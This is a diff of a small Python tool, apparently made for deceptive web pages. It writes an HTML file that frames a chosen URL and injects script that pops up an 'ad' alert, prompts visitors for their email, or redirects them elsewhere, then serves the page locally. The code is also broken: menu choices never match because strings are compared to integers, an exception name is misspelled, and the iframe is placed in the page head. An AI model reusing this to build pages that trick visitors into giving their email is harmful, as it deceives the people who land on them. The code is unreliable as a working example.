@@ -18,15 +18,15 @@ print("     [03] redirect to another website")
 print("     [04] Null")
 opt = input("choose a option")
 if opt == 1:
-   Ad = input("Ad: ")
-   Ads = True
+    Ad = input("Ad: ")
+    Ads = True
 elif opt == 2:
-   email = True
+    email = True
 elif opt == 3:
-   site = input("site to redirect")
-   red = True
+    site = input("site to redirect")
+    red = True
 else:
-   pass
+    pass
 os.system("hostname > host")
 op = open("host")
 opr = op.read()
@@ -38,23 +38,26 @@ os.mkdir("Page")
 os.chdir("Page")
 ope = open("site.html", "w")
 if Ad == True:
-   opew = ope.write("<html> \n <head> \n \t <iframe src='{}'> \n </head> \n <body> \n \t <script> window.alert('{}') </script> \n </body> \n </html>".format(cpurl, Ad))
+    opew = ope.write(
+        "<html> \n <head> \n \t <iframe src='{}'> \n </head> \n <body> \n \t <script> window.alert('{}') </script> \n </body> \n </html>".format(cpurl, Ad))
 elif email == True:
-   opew = ope.write("<html> \n <head> \n \t <iframe src='{}'> \n </head> \n <body> \n \t <script> window.alert('What is your email?' + prompt('email')) </script> \n </body> \n </html>".format(cpurl))
+    opew = ope.write("<html> \n <head> \n \t <iframe src='{}'> \n </head> \n <body> \n \t <script> window.alert('What is your email?' + prompt('email')) </script> \n </body> \n </html>".format(cpurl))
 elif red == True:
-   opew = ope.write("<html> \n <head> \n \t <iframe src='{}'> \n </head> \n <body> \n \t <script> window.open('{}') </script> \n </body> \n </html>".format(cpurl, site))
+    opew = ope.write(
+        "<html> \n <head> \n \t <iframe src='{}'> \n </head> \n <body> \n \t <script> window.open('{}') </script> \n </body> \n </html>".format(cpurl, site))
 else:
-   pass
+    pass
 ope.close()
 print("starting server...")
 print("sever started.")
 print("press ctrl + c to quit")
-os.system("python3 -m http.server 8080")
+try:
+   os.system("python3 -m http.server 8080")
 except KeyboardInterupt:
-   print("Restoring...")
-   os.system("hostname {}".format(opr))
-   sleep(0.5)
-   print("closing...")
-   sleep(0.5)
-   print("closed")
-   sys.exit()
+    print("Restoring...")
+    os.system("hostname {}".format(opr))
+    sleep(0.5)
+    print("closing...")
+    sleep(0.5)
+    print("closed")
+    sys.exit()
